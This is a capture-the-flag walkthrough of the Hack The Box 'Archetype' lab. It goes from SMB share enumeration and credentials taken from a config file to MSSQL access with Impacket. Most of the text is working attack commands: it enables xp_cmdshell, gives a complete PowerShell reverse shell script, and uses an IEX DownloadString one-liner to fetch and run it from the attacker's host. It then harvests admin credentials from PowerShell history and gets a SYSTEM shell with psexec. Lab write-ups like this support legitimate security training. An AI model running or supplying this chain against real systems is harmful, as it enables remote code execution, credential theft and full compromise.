# Archetype Walkthrough

### Requirement

Following packages are required on the attacking machine -

Make sure your system is equipped with `git`, `ncat`, `nmap`, `python3`, `smbclient`, and `ufw`
Secure Auth Corp's Impacket collection https://www.secureauth.com/labs/open-source-tools/impacket/

```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]

└─$ sudo apt-get python3-pip python3-venv git smbclient ncat nmap, utf
```

Connect to the machine using open vpn:

```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]
└─$ sudo openvpn /path/to/your/file.ovpn
```

Start up a new terminal to verify if you're connected to the vpn tunnel by pinging the target machine

```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]
└─$ ping 10.10.10.27
```
--------------------------------------------------------------------------
## Information gathering:

**Reconnaissance** -
```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]
└─$ nmap -sV -Pn -T4 10.10.10.27
```

You'd see couple of ports exposed, the most promising being 445 (smb) and 1433 (sql server).

We will target port 445 - *Server Message Block*, using `smbclient`

```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]
└─$ smbclient -L \\10.10.10.27
```

**Getting regular user access** -

Great, there are two available shares with read access:

> IPC$: this hidden share is a special share used for inter-process communication. It doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system.

> backups: a normal share with read access. It lacks a comment which means it could contain interesting data if we’re able to connect to it. 

```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]
└─$ smbclient \\\\10.10.10.27\\backups
```

Go ahead and explore the directory using `ls` and you'll notice a production configuration file `prod.dtsConfig`. Lets transfer that file to our local machine.

```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]
└─$ get prod.dtsConfig /home/<user>/Desktop/Archetype/secret
```

```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]
└─$ cat secret
```

--------------------------------------------------------------------------
## Began exploit:

On inspecting the file, you can see the username and password for the user.

We can use this information further, to connect to the *SQL Server*, and for this we’ll be using the `mssqlclient.py` script from the *Impacket toolkit*. 

```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]
└─$ sudo git clone https://github.com/SecureAuthCorp/impacket.git
```
```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]
└─$ cd impacket
```
```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype/Impacket]
└─$ sudo pip3 install .
```
```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype/Impacket]
└─$ cd examples
```
```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype/Impacket/examples]
└─$ python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
```
We insert the password found previously and we're in.
Next up, we run a query to find out if we have the highest privileges:

`SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')`

The output of the query should be 1 (= true), confirming that we have sysadmin privileges.

Now we can enable the `xp_cmdshell`, to spawn a Windows command shell and pass in a string for execution, to gain Remote Command Execution.

`SQL> EXEC sp_configure 'Show Advanced Options', 1;`
`SQL> reconfigure;`
`SQL> sp_configure;`
`SQL> EXEC sp_configure 'xp_cmdshell', 1`
`SQL> reconfigure;`
`SQL> xp_cmdshell "whoami"`

After a bit of research I found we can host a file containing the reverse shell script locally and then get the SQL server to connect to our machine.

Save the following script as `reverse_shell.ps1`. Also make note of the ip address for `$client`. Since we're using *open vpn*, we'd be required to use that ip and port instead.

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.19",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "# ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};
$client.Close()
```

Open up a new terminal to set up a Python http server to host the reverse shell script:

```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]
└─$ python3 -m http.server 80
```

Open up another terminal to start a netcat listening session on port 443:

```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]
└─$ nc -vnlp 443
```

Please note if you have your `ufw` firewall enabled in your VM, you'll need to change the rules to allow incoming requests to ports 80 and 443:

```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype]
└─$ ufw allow from 10.10.10.27 proto tcp to any port 80, 443
```

Heading back to the terminal with sql server, execute the following one-liner:

`SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.19/reverse_shell.ps1\");"`

And head back to the netcat listener to see if the shell spawned. If the script executed successfully, you should be able to see a shell there.

--------------------------------------------------------------------------
## Pwing the user account:

Once you can confirm the you've accessed the shell via user account `sql_svc`, start exploring the directory. 
 
The `user.txt` file containing the user flag is at the `sql_svc` user's desktop, so we just read the file:

`# whoami`
`# cd C:\Users\sql_svc\Desktop`
`# type user.txt`

Copy the hashcode and head over to your htb dashboard to submit it.

--------------------------------------------------------------------------
## Pwing the root account:

In order to get the root flag, we'll need to the root access i.e Administrator alias `nt authority\system`.
 
As this `sql_svc` account is a service account, it's good practice to check for recently accessed files and executed commands. 
To do so in PowerShell, we can insert the command below in our reverse shell:

`# type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

You should be able to see the administrative credentials.

Finally we will use another script from the Impacket package `psexec` located under `Impacket/examples`

```
┌──(ronnie㉿LAPTOP-4OEHOBBN)-[~/Desktop/Archetype/Impacket/examples]
└─$ python3 psexec.py administrator@10.10.10.27
```

Provide the password when prompted, and do a quick `whoami` check to verify the access..

Headover to the Desktop to access the `root.txt` file for root flag. 

`# whoami`
`# cd C:\Users\Administrator\Desktop`
`# type root.txt`

Copy the hash code and submit.
